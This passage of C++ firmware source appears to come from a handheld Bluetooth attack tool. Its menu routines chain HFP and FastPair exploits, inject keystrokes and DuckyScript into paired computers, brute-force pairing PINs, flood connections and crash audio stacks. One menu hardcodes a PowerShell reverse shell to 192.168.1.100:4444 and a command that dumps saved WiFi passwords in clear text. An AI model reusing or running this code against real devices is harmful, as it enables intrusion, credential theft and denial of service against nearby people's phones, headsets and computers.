    bool hasFastPair = false;
    
    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
            if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
                deviceName = scannerData.deviceNames[i];
                rssi = scannerData.deviceRssi[i];
                hasHFP = scannerData.deviceHasHFP[i];
                hasFastPair = scannerData.deviceFastPair[i];
                break;
            }
        }
        xSemaphoreGive(scannerData.mutex);
    }
    
    std::vector<String> lines;
    lines.push_back("UNIVERSAL ATTACK CHAIN");
    lines.push_back("Device: " + deviceName);
    lines.push_back("HFP: " + String(hasHFP ? "YES" : "NO"));
    lines.push_back("FastPair: " + String(hasFastPair ? "YES" : "NO"));
    
    bool hfpSuccess = false;
    bool fpSuccess = false;
    bool hidSuccess = false;
    
    if(hasHFP) {
        showAttackProgress("Phase 1: Testing HFP vulnerability...", TFT_CYAN);
        HFPExploitEngine hfp;
        hfpSuccess = hfp.executeHFPAttackChain(target);
        lines.push_back("HFP Attack: " + String(hfpSuccess ? "SUCCESS" : "FAILED"));
        
        if(hfpSuccess) {
            showAttackProgress("HFP success! Phase 2: HID injection...", TFT_GREEN);
            HIDAttackServiceClass hidAttack;
            hidSuccess = hidAttack.injectKeystrokes(target);
            lines.push_back("HID Injection: " + String(hidSuccess ? "SUCCESS" : "FAILED"));
        }
    }
    
    if(hasFastPair && (!hfpSuccess || !hidSuccess)) {
        showAttackProgress("Phase 3: Testing FastPair vulnerability...", TFT_BLUE);
        WhisperPairExploit exploit;
        fpSuccess = exploit.executeSilent(target);
        lines.push_back("FastPair Attack: " + String(fpSuccess ? "SUCCESS" : "FAILED"));
    }
    
    lines.push_back("");
    lines.push_back("Attack chain completed");
    
    if(hfpSuccess || fpSuccess || hidSuccess) {
        showDeviceInfoScreen("ATTACK SUCCESS", lines, TFT_GREEN, TFT_BLACK);
    } else {
        showDeviceInfoScreen("ATTACK FAILED", lines, TFT_RED, TFT_WHITE);
    }
}

void runWhisperPairAttack(NimBLEAddress target) {
    bool hasHFP = false;
    
    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
            if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
                hasHFP = scannerData.deviceHasHFP[i];
                break;
            }
        }
        xSemaphoreGive(scannerData.mutex);
    }
    
    if(hasHFP) {
        showAttackProgress("Device has HFP, testing first...", TFT_CYAN);
        HFPExploitEngine hfp;
        if(hfp.testCVE202536911(target)) {
            int choice = showAdaptiveMessage("Device has vulnerable HFP", 
                                            "Use HFP exploit first", 
                                            "Direct FastPair attack", 
                                            "Cancel", 
                                            TFT_ORANGE, true, false);
            
            if(choice == 0) {
                if(hfp.executeHFPAttackChain(target)) {
                    showAttackProgress("HFP successful! Now trying FastPair...", TFT_GREEN);
                }
            }
            if(choice == -1) return;
        }
    }
    
    WhisperPairExploit exploit;
    exploit.execute(target);
}

void runAdvancedExploit(NimBLEAddress target) {
    tft.fillScreen(bruceConfig.bgColor);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);

    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen("ADVANCED EXPLOIT") * 12) / 2, 15);
    tft.print("ADVANCED EXPLOIT");
    tft.setTextSize(1);

    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setCursor(20, 60);
    tft.println("Select Attack Type:");

    const char* attackTypes[] = {
        "Protocol State Confusion",
        "Crypto Overflow",
        "Handshake Only",
        "All Attacks"
    };

    int selectedType = 0;
    bool exitSubmenu = false;

    while(!exitSubmenu) {
        for(int i = 0; i < 4; i++) {
            int yPos = 90 + (i * 35);
            if(yPos + 30 > tftHeight - 45) break;

            if(i == selectedType) {
                tft.fillRoundRect(30, yPos, tftWidth - 60, 30, 5, TFT_WHITE);
                tft.setTextColor(TFT_BLACK, TFT_WHITE);
                tft.setCursor(40, yPos + 10);
                tft.print("> ");
            } else {
                tft.fillRoundRect(30, yPos, tftWidth - 60, 30, 5, TFT_DARKGREY);
                tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
                tft.setCursor(40, yPos + 10);
                tft.print("  ");
            }
            tft.print(attackTypes[i]);
        }

        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, tftHeight - 35);
        tft.print("SEL: Execute  PREV/NEXT: Navigate  ESC: Back");

        bool inputProcessed = false;
        while(!inputProcessed) {
            if(check(EscPress)) {
                exitSubmenu = true;
                inputProcessed = true;
            } else if(check(PrevPress)) {
                selectedType = (selectedType > 0) ? selectedType - 1 : 3;
                inputProcessed = true;
            } else if(check(NextPress)) {
                selectedType = (selectedType + 1) % 4;
                inputProcessed = true;
            } else if(check(SelPress)) {
                WhisperPairExploit exploit;
                bool result = false;
                if(selectedType == 3) {
                    result = exploit.execute(target);
                } else {
                    result = exploit.executeAdvanced(target, selectedType);
                }

                if(result) {
                    showAttackResult(true, "Advanced attack successful!");
                } else {
                    showAttackResult(false, "Advanced attack failed");
                }
                exitSubmenu = true;
                inputProcessed = true;
            }
            if(!inputProcessed) delay(50);
        }
    }
}

void runAudioStackCrash(NimBLEAddress target) {
    if(!confirmAttack("Crash audio stack?")) return;

    String connectionMethod = "";
    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
    if(!pClient) {
        showAttackResult(false, "Failed to connect");
        return;
    }

    showAttackProgress("Connected! Attacking audio stack...", TFT_GREEN);
    AudioAttackService audioAttack;
    bool result = audioAttack.crashAudioStack(target);

    std::vector<String> lines;
    lines.push_back("AUDIO STACK CRASH ATTACK");
    lines.push_back("Connection: " + connectionMethod);
    lines.push_back("Result: " + String(result ? "SUCCESS" : "FAILED"));
    lines.push_back("");

    if(result) {
        lines.push_back("Audio stack crash commands");
        lines.push_back("were successfully sent!");
        showDeviceInfoScreen("ATTACK SENT", lines, TFT_GREEN, TFT_BLACK);
    } else {
        lines.push_back("No audio services found or");
        lines.push_back("attack commands failed");
        showDeviceInfoScreen("ATTACK FAILED", lines, TFT_RED, TFT_WHITE);
    }
}

void runMediaCommandHijack(NimBLEAddress target) {
    if(!confirmAttack("Inject media commands?")) return;

    String connectionMethod = "";
    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
    if(!pClient) {
        showAttackResult(false, "Failed to connect");
        return;
    }

    showAttackProgress("Connected! Injecting media commands...", TFT_GREEN);
    AudioAttackService audioAttack;
    bool result = audioAttack.injectMediaCommands(target);

    std::vector<String> lines;
    lines.push_back("MEDIA COMMAND HIJACK");
    lines.push_back("Connection: " + connectionMethod);
    lines.push_back("Result: " + String(result ? "SUCCESS" : "FAILED"));
    lines.push_back("");

    if(result) {
        lines.push_back("Media control commands");
        lines.push_back("were successfully sent!");
        showDeviceInfoScreen("COMMANDS SENT", lines, TFT_GREEN, TFT_BLACK);
    } else {
        lines.push_back("No media services found or");
        lines.push_back("commands failed");
        showDeviceInfoScreen("ATTACK FAILED", lines, TFT_RED, TFT_WHITE);
    }
}

void runHIDInjection(NimBLEAddress target) {
    String deviceName = "";
    int rssi = -60;
    bool hasHFP = false;
    
    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
            if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
                deviceName = scannerData.deviceNames[i];
                rssi = scannerData.deviceRssi[i];
                hasHFP = scannerData.deviceHasHFP[i];
                break;
            }
        }
        xSemaphoreGive(scannerData.mutex);
    }
    
    if(hasHFP && deviceName.length() > 0) {
        int choice = showAdaptiveMessage("Device has HFP service", 
                                        "Try HFP pivot first", 
                                        "Direct HID attack", 
                                        "Cancel", 
                                        TFT_YELLOW, true, false);
        
        if(choice == 0) {
            HFPExploitEngine hfp;
            if(hfp.executeHFPAttackChain(target)) {
                showAttackProgress("HFP successful! Attempting HID...", TFT_GREEN);
                HIDAttackServiceClass hidAttack;
                if(hidAttack.injectKeystrokes(target)) {
                    showAttackResult(true, "HFP → HID chain successful!");
                } else {
                    showAttackResult(false, "HFP worked but HID failed");
                }
                return;
            } else {
                showAttackProgress("HFP failed, trying direct HID...", TFT_ORANGE);
                delay(500);
            }
        }
        if(choice == -1) return;
    }
    
    HIDAttackServiceClass hidAttack;
    bool result = hidAttack.injectKeystrokes(target);
    if(result) showAttackResult(true, "HID keystrokes attempted!");
    else showAttackResult(false, "HID injection failed");
}

void runDuckyScriptAttack(NimBLEAddress target) {
    String deviceName = "";
    int rssi = -60;
    bool hasHFP = false;
    
    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
            if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
                deviceName = scannerData.deviceNames[i];
                rssi = scannerData.deviceRssi[i];
                hasHFP = scannerData.deviceHasHFP[i];
                break;
            }
        }
        xSemaphoreGive(scannerData.mutex);
    }
    
    String script = getScriptFromUser();
    if(script.isEmpty()) return;
    
    if(hasHFP && deviceName.length() > 0) {
        int choice = showAdaptiveMessage("Device has HFP service", 
                                        "HFP pivot first", 
                                        "Direct injection", 
                                        "Cancel", 
                                        TFT_YELLOW, true, false);
        
        if(choice == 0) {
            HFPExploitEngine hfp;
            if(hfp.executeHFPAttackChain(target)) {
                showAttackProgress("HFP successful! Injecting script...", TFT_GREEN);
                HIDDuckyService duckyService;
                if(duckyService.injectDuckyScript(target, script)) {
                    showAttackResult(true, "HFP → DuckyScript successful!");
                } else {
                    showAttackResult(false, "HFP worked but script injection failed");
                }
                return;
            }
        }
        if(choice == -1) return;
    }
    
    HIDDuckyService duckyService;
    duckyService.injectDuckyScript(target, script);
}

void runPINBruteForce(NimBLEAddress target) {
    PairingAttackServiceClass pairingAttack;
    pairingAttack.bruteForcePIN(target);
}

void runConnectionFlood(NimBLEAddress target) {
    DoSAttackServiceClass dosAttack;
    dosAttack.connectionFlood(target);
}

void runAdvertisingSpam(NimBLEAddress target) {
    DoSAttackServiceClass dosAttack;
    dosAttack.advertisingSpam(target);
}

void runQuickTest(NimBLEAddress target) {
    showAttackProgress("Quick testing (HFP + FastPair)...", TFT_WHITE);
    
    bool hasHFP = false;
    
    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
            if(scannerData.deviceAddresses[i] == target.toString().c_str()) {
                hasHFP = scannerData.deviceHasHFP[i];
                break;
            }
        }
        xSemaphoreGive(scannerData.mutex);
    }
    
    std::vector<String> results;
    
    if(hasHFP) {
        HFPExploitEngine hfp;
        bool hfpVulnerable = hfp.testCVE202536911(target);
        results.push_back("HFP (CVE-2025-36911): " + String(hfpVulnerable ? "VULNERABLE" : "SAFE"));
    } else {
        results.push_back("HFP: Not detected");
    }
    
    WhisperPairExploit exploit;
    bool fpVulnerable = exploit.executeSilent(target);
    results.push_back("FastPair: " + String(fpVulnerable ? "VULNERABLE" : "SAFE"));
    
    std::vector<String> lines;
    lines.push_back("QUICK VULNERABILITY TEST");
    lines.push_back("Target: " + String(target.toString().c_str()));
    
    for(auto& result : results) {
        lines.push_back(result);
    }
    
    lines.push_back("");
    lines.push_back("Test completed");
    
    if(hasHFP && results[0].indexOf("VULNERABLE") != -1) {
        lines.push_back("Try HFP-based attacks first!");
        showDeviceInfoScreen("VULNERABLE DEVICE", lines, TFT_ORANGE, TFT_BLACK);
    } else if(fpVulnerable) {
        showDeviceInfoScreen("VULNERABLE", lines, TFT_RED, TFT_WHITE);
    } else {
        showDeviceInfoScreen("SAFE", lines, TFT_GREEN, TFT_BLACK);
    }
}

void runDeviceProfiling(NimBLEAddress target) {
    if(!confirmAttack("Profile device services?")) return;
    showAttackProgress("Profiling device...", TFT_WHITE);

    BLEAttackManager bleManager;
    DeviceProfile profile = bleManager.profileDevice(target);

    std::vector<String> lines;
    lines.push_back("DEVICE PROFILE REPORT");
    lines.push_back("Address: " + profile.address);
    lines.push_back("Connected: " + String(profile.connected ? "YES" : "NO"));

    if(profile.connected) {
        lines.push_back("Services found: " + String(profile.services.size()));
        lines.push_back("FastPair: " + String(profile.hasFastPair ? "YES" : "NO"));
        lines.push_back("AVRCP: " + String(profile.hasAVRCP ? "YES" : "NO"));
        lines.push_back("HID: " + String(profile.hasHID ? "YES" : "NO"));
        lines.push_back("Battery: " + String(profile.hasBattery ? "YES" : "NO"));
        lines.push_back("Device Info: " + String(profile.hasDeviceInfo ? "YES" : "NO"));

        int writableCount = 0;
        for(auto& ch : profile.characteristics) 
            if(ch.canWrite) writableCount++;
        lines.push_back("Writable chars: " + String(writableCount));
    } else {
        lines.push_back("Failed to connect for profiling");
    }

    showDeviceInfoScreen("DEVICE PROFILE", lines, TFT_BLUE, TFT_WHITE);
}

void runWriteAccessTest(NimBLEAddress target) {
    if(!confirmAttack("Test write access on all characteristics?")) return;

    String connectionMethod = "";
    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
    if(!pClient) {
        showAttackResult(false, "Failed to connect");
        return;
    }

    showAttackProgress("Connected! Testing write access...", TFT_GREEN);
    std::vector<String> writeableChars;

    const std::vector<NimBLERemoteService*>& services = pClient->getServices(true);
    for(auto& service : services) {
        const std::vector<NimBLERemoteCharacteristic*>& chars = service->getCharacteristics(true);
        for(auto& ch : chars) {
            if(ch->canWrite()) {
                std::string uuidStdStr = service->getUUID().toString();
                String uuidStr = String(uuidStdStr.c_str());
                std::string charUuidStdStr = ch->getUUID().toString();
                String charUuid = String(charUuidStdStr.c_str());
                String charInfo = uuidStr + " -> " + charUuid;
                writeableChars.push_back(charInfo);
            }
        }
    }

    pClient->disconnect();
    NimBLEDevice::deinit(true);

    if(!writeableChars.empty()) {
        std::vector<String> lines;
        lines.push_back("WRITABLE CHARACTERISTICS:");
        lines.push_back("Connection: " + connectionMethod);
        lines.push_back("Found: " + String(writeableChars.size()));

        for(int i = 0; i < std::min(5, (int)writeableChars.size()); i++) 
            lines.push_back(writeableChars[i]);

        if(writeableChars.size() > 5) 
            lines.push_back("... and " + String(writeableChars.size() - 5) + " more");

        showDeviceInfoScreen("WRITE ACCESS TEST", lines, TFT_BLUE, TFT_WHITE);
    } else {
        showAttackResult(false, "No writable characteristics found");
    }
}

void runProtocolFuzzer(NimBLEAddress target) {
    if(!confirmAttack("Fuzz BLE protocol with random data?")) return;

    String connectionMethod = "";
    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
    if(!pClient) {
        showAttackResult(false, "Failed to connect");
        return;
    }

    showAttackProgress("Connected! Fuzzing protocol...", TFT_GREEN);
    NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0xFE2C));
    if(!pService) {
        showAttackResult(false, "No FastPair service found");
        pClient->disconnect();
        NimBLEDevice::deinit(true);
        return;
    }

    NimBLERemoteCharacteristic* pChar = nullptr;
    const std::vector<NimBLERemoteCharacteristic*>& chars = pService->getCharacteristics(true);
    for(auto& ch : chars) {
        if(ch->canWrite()) { pChar = ch; break; }
    }

    if(!pChar) {
        showAttackResult(false, "No writable characteristic");
        pClient->disconnect();
        NimBLEDevice::deinit(true);
        return;
    }

    bool anySent = false;
    for(int i = 0; i < 10; i++) {
        uint8_t fuzzPacket[64];
        switch(i % 4) {
            case 0: memset(fuzzPacket, 0xFF, sizeof(fuzzPacket)); break;
            case 1: memset(fuzzPacket, 0x00, sizeof(fuzzPacket)); break;
            case 2: for(int j = 0; j < sizeof(fuzzPacket); j++) fuzzPacket[j] = random(256); break;
            case 3: fuzzPacket[0] = 0x00; memset(&fuzzPacket[1], 0x41, sizeof(fuzzPacket)-1); break;
        }
        bool sent = pChar->writeValue(fuzzPacket, sizeof(fuzzPacket), true);
        if(sent) anySent = true;
        delay(100);
    }

    pClient->disconnect();
    NimBLEDevice::deinit(true);

    if(anySent) showAttackResult(true, "Fuzzing completed!");
    else showAttackResult(false, "Fuzzing failed");
}

void runJamConnectAttack(NimBLEAddress target) {
    MultiConnectionAttack attack;
    attack.jamAndConnect(target);
}

void runHIDTest(NimBLEAddress target) {
    if(!confirmAttack("Test HID (Keyboard/Mouse) capabilities?")) return;

    String connectionMethod = "";
    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
    if(!pClient) {
        showAttackResult(false, "Failed to connect");
        return;
    }

    showAttackProgress("Connected! Testing HID services...", TFT_GREEN);
    std::vector<String> hidServices;

    const std::vector<NimBLERemoteService*>& services = pClient->getServices(true);
    for(auto& service : services) {
        NimBLEUUID uuid = service->getUUID();
        std::string uuidStdStr = uuid.toString();
        String uuidStr = String(uuidStdStr.c_str());

        if(uuidStr.indexOf("1812") != -1 || uuidStr.indexOf("1813") != -1 || uuidStr.indexOf("1814") != -1 || 
           uuidStr.indexOf("2a4a") != -1 || uuidStr.indexOf("2a4b") != -1 || uuidStr.indexOf("2a4d") != -1) {
            hidServices.push_back(uuidStr + " - HID Service");
        }

        const std::vector<NimBLERemoteCharacteristic*>& chars = service->getCharacteristics(true);
        for(auto& ch : chars) {
            std::string charUuidStdStr = ch->getUUID().toString();
            String charUuid = String(charUuidStdStr.c_str());
            if(charUuid.indexOf("2a4d") != -1 || charUuid.indexOf("2a22") != -1 || charUuid.indexOf("2a32") != -1) {
                hidServices.push_back("  -> " + charUuid);
            }
        }
    }

    pClient->disconnect();
    NimBLEDevice::deinit(true);

    if(!hidServices.empty()) {
        std::vector<String> lines;
        lines.push_back("HID SERVICES FOUND:");
        lines.push_back("Connection: " + connectionMethod);

        for(int i = 0; i < std::min(6, (int)hidServices.size()); i++) 
            lines.push_back(hidServices[i]);

        if(hidServices.size() > 6) 
            lines.push_back("... and " + String(hidServices.size() - 6) + " more");

        showDeviceInfoScreen("HID TEST RESULTS", lines, TFT_DARKGREEN, TFT_WHITE);
    } else {
        showAttackResult(false, "No HID services found");
    }
}

void runAudioControlTest(NimBLEAddress target) {
    const int AUDIO_TESTS = 4;
    const char* audioTestNames[] = {
        "Test AVRCP Service",
        "Test Media Control",
        "Test Telephony",
        "Test All Audio"
    };

    int selectedTest = 0;
    bool exitSubmenu = false;

    while(!exitSubmenu) {
        tft.fillScreen(bruceConfig.bgColor);
        tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);

        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setTextSize(2);
        tft.setCursor((tftWidth - strlen("AUDIO CONTROL TEST") * 12) / 2, 15);
        tft.print("AUDIO CONTROL TEST");
        tft.setTextSize(1);

        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, 60);
        tft.println("Select Audio Test:");

        int maxTests = std::min(AUDIO_TESTS, 5);
        int testHeight = 35;
        int startY = 90;

        for(int i = 0; i < maxTests; i++) {
            int yPos = startY + (i * testHeight);
            if(yPos + testHeight > tftHeight - 45) break;

            if(i == selectedTest) {
                tft.fillRoundRect(30, yPos, tftWidth - 60, testHeight - 5, 5, TFT_WHITE);
                tft.setTextColor(TFT_BLACK, TFT_WHITE);
                tft.setCursor(40, yPos + 10);
                tft.print("> ");
            } else {
                tft.fillRoundRect(30, yPos, tftWidth - 60, testHeight - 5, 5, TFT_DARKGREY);
                tft.setTextColor(TFT_WHITE, TFT_DARKGREY);
                tft.setCursor(40, yPos + 10);
                tft.print("  ");
            }
            tft.print(audioTestNames[i]);
        }

        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, tftHeight - 35);
        tft.print("SEL: Test  PREV/NEXT: Navigate  ESC: Back");

        bool inputProcessed = false;
        while(!inputProcessed) {
            if(check(EscPress)) {
                exitSubmenu = true;
                inputProcessed = true;
            } else if(check(PrevPress)) {
                selectedTest = (selectedTest > 0) ? selectedTest - 1 : AUDIO_TESTS - 1;
                inputProcessed = true;
            } else if(check(NextPress)) {
                selectedTest = (selectedTest + 1) % AUDIO_TESTS;
                inputProcessed = true;
            } else if(check(SelPress)) {
                executeAudioTest(selectedTest, target);
                exitSubmenu = true;
                inputProcessed = true;
            }
            if(!inputProcessed) delay(50);
        }
    }
}

void executeAudioTest(int testIndex, NimBLEAddress target) {
    String connectionMethod = "";
    NimBLEClient* pClient = attemptConnectionWithStrategies(target, connectionMethod);
    if(!pClient) {
        showAttackResult(false, "Failed to connect");
        return;
    }

    AudioAttackService audioAttack;
    switch(testIndex) {
        case 0:
            showAttackProgress("Testing AVRCP service...", TFT_WHITE);
            if(pClient->discoverAttributes()) {
                NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x110E));
                if(pService) {
                    audioAttack.attackAVRCP(pService);
                    showAttackResult(true, "AVRCP test completed");
                } else showAttackResult(false, "No AVRCP service found");
            }
            break;
        case 1:
            showAttackProgress("Testing Media Control...", TFT_WHITE);
            if(pClient->discoverAttributes()) {
                NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x1843));
                if(pService) {
                    audioAttack.attackAudioMedia(pService);
                    showAttackResult(true, "Media control test completed");
                } else showAttackResult(false, "No Media service found");
            }
            break;
        case 2:
            showAttackProgress("Testing Telephony...", TFT_WHITE);
            if(pClient->discoverAttributes()) {
                NimBLERemoteService* pService = pClient->getService(NimBLEUUID((uint16_t)0x1124));
                if(pService) {
                    audioAttack.attackTelephony(pService);
                    showAttackResult(true, "Telephony test completed");
                } else showAttackResult(false, "No Telephony service found");
            }
            break;
        case 3:
            showAttackProgress("Testing all audio services...", TFT_WHITE);
            audioAttack.executeAudioAttack(target);
            showAttackResult(true, "Complete audio test done");
            break;
    }
    pClient->disconnect();
    NimBLEDevice::deinit(true);
}

void runVulnerabilityScan(NimBLEAddress target) {
    VulnerabilityScanner scanner;
    scanner.scanDevice(target);
}

void runForceHIDInjection(NimBLEAddress target) {
    String deviceInfo = selectTargetFromScan("SELECT HID TARGET");
    if(deviceInfo.isEmpty()) return;

    int colonPos = deviceInfo.lastIndexOf(':');
    if(colonPos == -1) return;

    String mac = deviceInfo.substring(0, colonPos);
    String name = "";
    int rssi = -60;
    bool hasHFP = false;

    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
            if(scannerData.deviceAddresses[i] == mac) {
                name = scannerData.deviceNames[i];
                rssi = scannerData.deviceRssi[i];
                hasHFP = scannerData.deviceHasHFP[i];
                break;
            }
        }
        xSemaphoreGive(scannerData.mutex);
    }

    String script = getScriptFromUser();
    if(script.isEmpty()) return;
    
    if(hasHFP && !name.isEmpty()) {
        showAttackProgress("Device has HFP, attempting pivot...", TFT_CYAN);
        HFPExploitEngine hfp;
        if(hfp.executeHFPAttackChain(target)) {
            showAttackProgress("HFP successful! Forcing script injection...", TFT_GREEN);
            HIDDuckyService duckyService;
            bool result = duckyService.forceInjectDuckyScript(target, script, name, rssi);
            
            if(result) {
                showAttackResult(true, "HFP → Forced injection successful!");
            } else {
                showAttackResult(false, "HFP worked but forced injection failed");
            }
            return;
        } else {
            showAttackProgress("HFP failed, trying regular forced injection...", TFT_ORANGE);
        }
    }

    HIDDuckyService duckyService;
    bool result = duckyService.forceInjectDuckyScript(target, script, name, rssi);

    if(result) {
        showAttackResult(true, "Forced HID injection successful!");
    } else {
        showAttackResult(false, "Forced injection failed");
    }
}

void runHIDConnectionExploit(NimBLEAddress target) {
    String deviceInfo = selectTargetFromScan("TEST HID CONNECTION");
    if(deviceInfo.isEmpty()) return;

    int colonPos = deviceInfo.lastIndexOf(':');
    if(colonPos == -1) return;

    String mac = deviceInfo.substring(0, colonPos);
    String name = "";
    int rssi = -60;
    bool hasHFP = false;

    if(xSemaphoreTake(scannerData.mutex, portMAX_DELAY)) {
        for(size_t i = 0; i < scannerData.deviceAddresses.size(); i++) {
            if(scannerData.deviceAddresses[i] == mac) {
                name = scannerData.deviceNames[i];
                rssi = scannerData.deviceRssi[i];
                hasHFP = scannerData.deviceHasHFP[i];
                break;
            }
        }
        xSemaphoreGive(scannerData.mutex);
    }

    if(hasHFP && !name.isEmpty()) {
        int choice = showAdaptiveMessage("Device has HFP", 
                                        "Test HFP vulnerability", 
                                        "Test HID connection", 
                                        "Cancel", 
                                        TFT_YELLOW, true, false);
        
        if(choice == 0) {
            HFPExploitEngine hfp;
            bool hfpVulnerable = hfp.testCVE202536911(target);
            
            if(hfpVulnerable) {
                std::vector<String> lines;
                lines.push_back("HFP VULNERABILITY TEST");
                lines.push_back("Device: " + name);
                lines.push_back("HFP: POTENTIALLY VULNERABLE");
                lines.push_back("");
                lines.push_back("Device has HFP service with");
                lines.push_back("possible access issues");
                showDeviceInfoScreen("HFP WARNING", lines, TFT_ORANGE, TFT_BLACK);
                return;
            }
        }
        if(choice == -1) return;
    }

    HIDExploitEngine hidExploit;
    HIDConnectionResult result = hidExploit.forceHIDConnection(parseAddress(mac), name, rssi);

    if(result.success) {
        std::vector<String> lines;
        lines.push_back("HID CONNECTION EXPLOIT SUCCESS");
        lines.push_back("Device: " + name);
        lines.push_back("Method: " + result.method);
        lines.push_back("Attempts: " + String(result.attemptCount));
        lines.push_back("Time: " + String(result.attemptTime) + "ms");
        lines.push_back("");
        lines.push_back("Device vulnerable to HID");
        lines.push_back("connection exploitation");
        showDeviceInfoScreen("EXPLOIT SUCCESS", lines, TFT_GREEN, TFT_BLACK);
    } else {
        showAttackResult(false, "HID connection exploit failed");
    }
}

void runAdvancedDuckyInjection(NimBLEAddress target) {
    String deviceInfo = selectTargetFromScan("ADVANCED DUCKY INJECT");
    if(deviceInfo.isEmpty()) return;

    tft.fillScreen(bruceConfig.bgColor);
    tft.drawRect(5, 5, tftWidth - 10, tftHeight - 10, TFT_WHITE);

    tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
    tft.setTextSize(2);
    tft.setCursor((tftWidth - strlen("ADVANCED DUCKY") * 12) / 2, 15);
    tft.print("ADVANCED DUCKY");
    tft.setTextSize(1);

    const char* scripts[] = {
        "Open Calculator",
        "Open CMD/Terminal",
        "Reverse Shell",
        "WiFi Credentials",
        "Custom Script",
        "Back"
    };

    int selected = 0;
    bool exitMenu = false;

    while(!exitMenu) {
        for(int i = 0; i < 6; i++) {
            int yPos = 60 + (i * 30);
            if(yPos + 25 > tftHeight - 45) break;

            if(i == selected) {
                tft.fillRect(30, yPos, tftWidth - 60, 25, TFT_WHITE);
                tft.setTextColor(TFT_BLACK, TFT_WHITE);
                tft.setCursor(35, yPos + 8);
                tft.print("> ");
            } else {
                tft.fillRect(30, yPos, tftWidth - 60, 25, bruceConfig.bgColor);
                tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
                tft.setCursor(35, yPos + 8);
                tft.print("  ");
            }
            tft.print(scripts[i]);
        }

        tft.setTextColor(TFT_WHITE, bruceConfig.bgColor);
        tft.setCursor(20, tftHeight - 35);
        tft.print("SEL: Select  PREV/NEXT: Navigate  ESC: Back");

        bool inputProcessed = false;
        while(!inputProcessed) {
            if(check(EscPress)) {
                exitMenu = true;
                inputProcessed = true;
            } else if(check(PrevPress)) {
                selected = (selected > 0) ? selected - 1 : 5;
                inputProcessed = true;
            } else if(check(NextPress)) {
                selected = (selected + 1) % 6;
                inputProcessed = true;
            } else if(check(SelPress)) {
                if(selected == 5) {
                    exitMenu = true;
                } else {
                    String script = "";

                    switch(selected) {
                        case 0: script = "GUI r\nDELAY 500\nSTRING calc\nDELAY 300\nENTER"; break;
                        case 1: 
                            #ifdef WINDOWS
                            script = "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER";
                            #else
                            script = "GUI\nDELAY 500\nSTRING terminal\nDELAY 300\nENTER";
                            #endif
                            break;
                        case 2: script = "GUI r\nDELAY 500\nSTRING powershell -w h -NoP -NonI -Exec Bypass $client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\nENTER"; break;
                        case 3: script = "GUI r\nDELAY 500\nSTRING cmd\nDELAY 300\nENTER\nDELAY 500\nSTRING netsh wlan show profile name=* key=clear\nDELAY 300\nENTER"; break;
                        case 4: script = getScriptFromUser(); break;
                    }

                    if(!script.isEmpty()) {
                        HIDDuckyService duckyService;
                        bool result = duckyService.forceInjectDuckyScript(target, script, "", 0);

                        if(result) {
                            showAttackResult(true, "Advanced injection successful!");
                        } else {
                            showAttackResult(false, "Injection failed");
                        }
                    }
                }
                inputProcessed = true;
            }
            if(!inputProcessed) delay(50);
        }
    }
}

void runHIDVulnerabilityTest(NimBLEAddress target) {
    HIDExploitEngine hidExploit;
    bool isVulnerable = hidExploit.testHIDVulnerability(target);

    if(isVulnerable) {
        std::vector<String> lines;
        lines.push_back("HID VULNERABILITY TEST");
        lines.push_back("Target: " + String(target.toString().c_str()));
        lines.push_back("Status: VULNERABLE");
        lines.push_back("");
        lines.push_back("Device has HID service");
        lines.push_back("with write access");
        lines.push_back("");
        lines.push_back("Keystroke injection possible");
        showDeviceInfoScreen("VULNERABLE", lines, TFT_RED, TFT_WHITE);
    } else {
        showAttackResult(false, "Device not vulnerable to HID injection");
    }
}

void runHFPVulnerabilityTest(NimBLEAddress target) {
    if(!confirmAttack("Test HFP vulnerability (CVE-2025-36911)?")) return;
    
    HFPExploitEngine hfp;
    bool vulnerable = hfp.testCVE202536911(target);
    
